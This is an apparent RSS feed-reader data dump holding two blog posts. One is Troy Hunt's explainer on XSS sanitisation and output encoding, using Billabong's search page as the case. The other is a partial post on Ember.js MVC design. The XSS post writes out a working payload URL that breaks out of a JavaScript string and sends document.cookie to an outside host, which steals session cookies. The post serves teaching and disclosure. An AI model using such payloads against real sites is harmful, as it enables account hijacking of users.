needed to get software into production.</p></div></div>","author":false,"_id":{"$wrap":"$oid","v":1131}}
{"k":"0000000084","o":"0000020421","v":"001"}
{"_id":1132,"_uid":1132,"_dt":1373742620938,"_s":"9dc7087f38181d6fe755837c2f0b1f39"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/93WStnpJ4b0/understanding-xss-input-sanitisation.html","title":"Understanding XSS – input sanitisation semantics and output encoding contexts","published":{"$wrap":"$date","v":1369858740001,"h":"2013-05-29T20:19:00.001Z"},"starred":false,"read":false,"content":"<p>Cross site scripting (henceforth referred to as XSS) is one of those attacks that’s both extremely prevalent (remember, it’s number 2 on<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">the OWASP Top 10</a>) and frequently misunderstood. You’ll very often see<em>some</em>attempt at mitigating the risk but then find it’s easily circumvented because the developers weren’t fully aware of the attack vectors.</p><p>Last week someone flicked me over a great example of this after having read my previous post<a href=\"http://www.troyhunt.com/2012/07/heres-why-we-keep-getting-hacked-clear.html\">Here’s why we keep getting hacked – clear and present Billabong failures</a>. In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada. Again.</p><p>Disclosure is indeed hard.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/93WStnpJ4b0\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1132}}
{"k":"0000000084","o":"0000032746","v":"001"}
{"_id":1133,"_uid":1133,"_dt":1373742620939,"_s":"4ea20251342d41451b9c347522053a2e"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/fCXbpkBXK6M/ember-confuses-me","title":"EmberJS Confuses Me","published":{"$wrap":"$date","v":1362582000000,"h":"2013-03-06T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I've been teeth-deep in Client-side Javascript frameworks over the last 4 months for Tekpub. This month is Angular, last month was Ember's turn and I gave up. It's the first time I've given up - here's why.</p><p><img src='http://wekeroad.com/images/spinning-dizzy.jpeg'/></p><p><h2>I Tried</h2><p>Saying something confuses me is no great claim - many things do. It's entirely likely that I didn't study Ember long enough, or maybe I didn't give it the\"time to soak in\" that it deserved. Either way I punted on my efforts to bring an Ember title to Tekpub.</p><p>Normally I'd just go about my business and sidestep posts like this one - but today I had a conversation with Trek Glowacki (core dev on the Ember team) and he was confused as to my confusion. I offered to blog my thoughts - he couldn't understand the points I was making about my confusion.</p><p>So here's that post, stripped of hyperbole and\"it's ON FIRE\" statements. It's my honest take on this framework.</p><h2>You Keep Telling Me It's MVC...</h2><p>Yes, the concept of MVC has been contorted over the past decade as web frameworks have adopted it and massaged it to their own ends. What does this mean?</p><ul><li>Controllers in web MVC have a very short lifespan, and there are a lot of them typically</li><li>Views dont' communicate directly to a controller - they have to use an intermediary layer in HTTP (headers, querystring, etc)</li><li>Models are injected into views by Controllers</li><li>Controllers don't command the views directly</li></ul><p>In more classic MVC (aka\"Desktop\") your controllers are typically spun up when the app starts, and configured one time, right there. A controller's job is to command aspects of the view as data changes, and to change the model when things on the view happen that mandate it.</p><p>The model encapsulates the business logic for whatever its modeling, the view presents the data in a nicely formatted way to the user, and the controller sits between. I think we agree on this much - so what's the problem?</p><p>OK this is MVC as far as I have come to know it. There are lots of denominations I am sure - I have to think the church of MVC is about as crowded as the church of REST on any given holiday but there's room for all of us so let's move on...</p><h2>Separation. Only Not.</h2><p>In EmberJS, the<a href=\"http://emberjs.com/guides/controllers/\">controller's job is changed a bit</a>:</p><blockquote><p>A controller may have one or both of these responsibilities:</p><ul><li>Representing a model for a template.</li><li>Storing application properties that do not need to be saved to the server.</li></ul><p>Most of your controllers will be very small. Unlike other frameworks, where the state of your application is spread amongst many controllers, in Ember.js, we encapsulate that state in the router. This allows your controllers to be lightweight and focused on one thing.</p></blockquote><p>For me, this is where the confusion begins. A controller proxies the model, and then exposes itself to the rendering engine so that the view can consume it (you may need to read that sentence twice). As a result, we have view code like this (this is Handlebars):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each person in personController}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p>This can be shorthanded to this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='html'><span class='line'>{{#each controller}}</span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>{{name}}<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'>{{/each}}</span></code></pre></td></tr></table></div></figure><p><strong>This is where I hit a conceptual wall</strong>. First: let me say that I'm not the best programmer in the world and I could be dead wrong on this. But as far as I understand it, this is about as tightly bound as we can make things.</p><p>As stated above, a controller\"proxies\" the model onto itself for use in the view. I'm trying my best to reconcile this with the notion that a controller (classically speaking) is supposed to ... well<strong>control</strong>the view. Here, it's not doing that.</p><p>If I'm not mistaken, the view is controlling the controller and the model is nowhere to be found. Well that's not true I spose:<strong>the model is the controller</strong>. Sort of. Well it's not literally the same thing in concept but in practice the controller and the model are one. Bound. Together. Tightly.</p><p>In Angular this separation is achieved by a\"scope\" object that is, basically, a vehicle of sorts that gets passed between the controller and the view:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">PersonCtrl</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$scope</span><span class=\"p\">){</span></span><span class='line'><span class=\"nx\">$scope</span><span class=\"p\">.</span><span class=\"nx\">people</span><span class=\"o\">=</span><span class=\"p\">[{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Rob\"</span><span class=\"p\">},</span><span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span><span class=\"s2\">\"Mary\"</span><span class=\"p\">}]</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>In your view, you declare which controller you're using and then consume the information that's on the scope:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-controller=</span><span class=\"s\">'PersonCtrl'</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>The downside to this approach is that your HTML is\"compromised\", if you will, and many developers don't like that. My thought is that<strong>it's already compromised using Handlebars</strong>so what's the difference here?  Personally I have no issue using the ng-* directives. Some people do, and I respect that.</p><p>But let's get to the controller code. Notice that the $scope is injected? That's Dependency Injection at work and is a core concept in Angular which greatly helps testability.</p><p>Now you might be saying\"but ROB! The controller is declared directly in the view! That's the same problem!\". And that's true - until you loop in routing (below) and you can remove that directive since it's handled explicitly by routing:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;div</span><span class=\"na\">ng-app</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;li</span><span class=\"na\">ng-repeat=</span><span class=\"s\">'person in people'</span><span class=\"nt\">&gt;</span>{{person.name}}<span class=\"nt\">&lt;/li&gt;</span></span><span class='line'><span class=\"nt\">&lt;/ul&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span></code></pre></td></tr></table></div></figure><p>In Backbone a view is created (optionally) with the model (or collection) that it needs for data. There are no controllers (classically) in Backbone - though you can surely wedge one if needed and have it deal with the view.</p><p>These concepts align with my understanding of MVC. Not the case with Ember - if anything it confuses me greatly.</p><h2>Routes, Objects, and More Confusion</h2><p>I can get past the controller issue - I'm not a purist and if there's a reason the team wanted it this way, then I believe them.<a href=\"http://yehudakatz.com/\">It's Yehuda</a>and I think Yehuda is a very nice and smart person (as is<a href=\"http://tomdale.net/\">Tom Dale</a>- the co-creator of Ember).</p><p>I respect these guys so much I want to be very careful to<strong>not suggest</strong>that they don't know what they're doing. As I keep saying:<strong>this is my confusion</strong>. I own it.</p><p>Which brings me to Routes. Here's<a href=\"http://emberjs.com/guides/routing/defining-your-routes/\">one way to define a route</a>using EmberJS that looks rather familiar:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">resource</span><span class=\"p\">(</span><span class=\"s1\">'posts'</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s1\">'/posts'</span><span class=\"p\">},</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s1\">'new'</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Rails devs will recognize this straight away as a Resourceful Route. But what does a\"resource\" have to do with a Desktop app? When talking routes, urls, and resources - that's a RESTful consideration and involves stateless state\"stuff\" (sidestepping the REST debate here).<strong>What is this concept doing in a desktop app?</strong>.</p><p>Here's another way to define a route:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Router</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"about\"</span><span class=\"p\">);</span></span><span class='line'><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">route</span><span class=\"p\">(</span><span class=\"s2\">\"favorites\"</span><span class=\"p\">,</span><span class=\"p\">{</span><span class=\"nx\">path</span><span class=\"o\">:</span><span class=\"s2\">\"/favs\"</span><span class=\"p\">});</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is straightforward. Client MVC apps can manipulate browser history with\"hashbang\" URLs for bookmarking convenience. To manage that, we use a router and define routes.</p><p>And if you know that Ember relies heavily on naming conventions you could probably assume that you'll need an AboutController and a FavoritesController (like Rails - and Yehuda is a Rails core dev too so it would make sense...).</p><p>But that's not quite what needs to happen. You need to also define a RouteObject (which you can think of as a route handler):</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">FavoritesRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">()</span><span class=\"p\">{</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">Favorites</span><span class=\"p\">.</span><span class=\"nx\">find</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">},</span></span><span class='line'><span class=\"nx\">setupController</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">controller</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">)</span><span class=\"p\">{</span></span><span class='line'><span class=\"nx\">controller</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s1\">'content'</span><span class=\"p\">,</span><span class=\"nx\">model</span><span class=\"p\">);</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>I've been repeatedly told that\"Ember uses MVC in the classical Desktop way\" following Cocoa/Smalltalk style. OK I can buy that - but if that's the case<strong>why are controllers being tied to routes and models</strong>, conceptually? That might make sense for the web, but hardly for a desktop app.</p><p>Now I completely understand that we can throw theory at this<a href=\"http://st-www.cs.illinois.edu/users/smarch/st-docs/mvc.html\">and that Smalltalk-80 MVC</a>was instrumental in forming the concept behind Ember.</p><p>But even then - one model could be used in many controllers (and the reverse) depending on the need. I'm happy to shift my mind into Desktop mode - but it seems Ember still wants to retain some conceptual likeness to Rails, which I find most ... strange.</p><p>I remember watching<a href=\"http://blog.peepcode.com\">Geoffrey Grosenbach</a>explaining this in<a href=\"https://peepcode.com/products/emberjs\">Peepcode's very well done video tutorial on EmberJS</a>and feeling rather confused. I rewound the section and played it back, to see if I could understand what I was seeing.</p><p>And rewound it a few more times after that. It wasn't sinking in. I could not understand the difference between declaring a route, and configuring a RouteObject. Why not have the URL be a setting on the Ember.Route?</p><p>Now it could be that it was this way in the past - I've only gotten to know Ember 1.0 rc1 and I also know that the API changes rather dramatically from time to time.</p><p>But this is really confusing.</p><p>Here's how you do it in Angular:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span 